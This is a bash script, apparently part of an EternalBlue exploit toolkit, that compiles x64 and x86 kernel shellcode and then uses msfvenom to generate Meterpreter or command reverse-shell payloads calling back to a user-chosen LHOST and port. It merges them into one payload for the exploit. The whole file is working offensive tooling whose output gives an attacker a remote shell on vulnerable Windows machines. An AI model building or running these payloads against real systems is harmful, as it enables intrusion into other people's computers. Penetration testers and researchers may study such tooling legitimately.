#!/bin/bash
set -e
cat << "EOF"
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
EOF
echo Eternal Blue Windows Shellcode Compiler
echo
echo Let\'s compile them windoos shellcodezzz
echo
echo Compiling x64 kernel shellcode
nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
echo 'Compiling x86 kernel shellcode'
nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
echo kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? \(Y\/n\)
read genMSF
if [[ $genMSF =~ [yY](es)* ]]
then
    echo LHOST for reverse connection:
    read ip
    echo LPORT you want x64 to listen on:
    read portOne
    echo LPORT you want x86 to listen on:
    read portTwo
    echo Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
    read cmd
    if [[ $cmd -eq 0 ]]
    then
        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
        read cmd
        if [[ $cmd -eq 0 ]]
        then
            echo Generating x64 meterpreter shell \(staged\)...
            echo
            echo msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
            msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
            echo 
            echo Generating x86 meterpreter shell \(staged\)...
            echo
            echo msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
            msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
        elif [[ $cmd -eq 1 ]]
        then
            echo Generating x64 meterpreter shell \(stageless\)...
            echo
            echo msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
            msfvenom -p windows/x64/meterpreter_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
            echo 
            echo Generating x86 meterpreter shell \(stageless\)...
            echo
            echo msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
            msfvenom -p windows/meterpreter_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
        else
            echo Invalid option...exiting...
            exit 1
        fi
    elif [[ $cmd -eq 1 ]]
    then
        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
        read cmd
        if [[ $cmd -eq 0 ]]
        then
            echo Generating x64 cmd shell \(staged\)...
            echo
            echo msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
            msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
            echo
            echo Generating x86 cmd shell \(staged\)...
            echo
            echo msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
            msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
        elif [[ $cmd -eq 1 ]]
        then
            echo Generating x64 cmd shell \(stageless\)...
            echo
            echo msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
            msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portOne
            echo
            echo Generating x86 cmd shell \(stageless\)...
            echo
            echo msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
            msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=$ip LPORT=$portTwo
        else
            echo Invalid option...exiting...
            exit 1
        fi
    else
        echo Invalid option...exiting...
        exit 1
    fi
echo
echo MERGING SHELLCODE WOOOO!!!
cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
else
    echo Okay cool, make sure you merge your own shellcode properly :\)
fi
echo DONE
exit 0
